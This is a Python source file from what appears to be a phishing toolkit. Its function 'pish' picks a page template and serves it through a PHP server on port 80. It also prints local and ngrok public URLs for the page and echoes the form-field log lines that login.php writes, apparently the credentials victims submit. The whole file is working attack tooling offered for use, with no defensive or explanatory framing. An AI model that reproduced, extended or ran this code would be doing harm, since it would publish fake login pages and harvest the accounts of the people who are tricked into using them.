"""
Original Author : https://github.com/karthi-the-hacker
Fork Author     : https://github.com/minefarts
"""
from colorama import Fore, Style, init
from includes import utils, dynamic_url
import os, threading, subprocess
from rich.console import Console

init(autoreset=True)

console = Console()

def pish(selected_template):

    print(Fore.GREEN + "✅ " + Style.BRIGHT + "Selected Template: " + Fore.CYAN + f"{selected_template}" + Style.RESET_ALL)
    
    template_path = os.path.join("templates", selected_template)

    local_ip = utils.getip()
    ngrok_url = dynamic_url.re_url()

    print()
    print(f"{Fore.CYAN + Style.BRIGHT}[🌐 Localhost URL]{Style.RESET_ALL}   ➤  {Fore.YELLOW}http://{local_ip}/{selected_template}/")
    print(f"{Fore.GREEN + Style.BRIGHT}[🚀 Ngrok Public URL]{Style.RESET_ALL} ➤  {Fore.MAGENTA}{ngrok_url}/{selected_template}/")
    print(template_path)

    # Function to run PHP server
    def run_php():    

        php_process = subprocess.Popen(
            ["php", "-S", "0.0.0.0:80", "-t", "templates"],
            stdout = subprocess.DEVNULL,  # Suppress normal STDOUT (PHP logs)
            stderr = subprocess.PIPE,     # Capture STDERR (your table logs)
            text = True
        )

        # Print only custom table output from login.php
        try:
            for line in php_process.stderr:
                if "FIELD" in line or "+" in line or "|" in line:
                    print(line.strip())

        except KeyboardInterrupt:
            php_process.terminate()

    # Run PHP server in background thread
    server_thread = threading.Thread(target=run_php, daemon=True)
    server_thread.start()

    # Wait for user input to stop
    if input(f"{Fore.RED}⛔ Press 0 to stop the PHP server and return to menu: {Style.RESET_ALL}\n").strip() == "0":

        print(f"{Fore.YELLOW}🛑 Stopping PHP server...{Style.RESET_ALL}")
        
        os.system("pkill -f 'php -S'")  # Works on Unix/macOS. For Windows, use .terminate() with stored process.
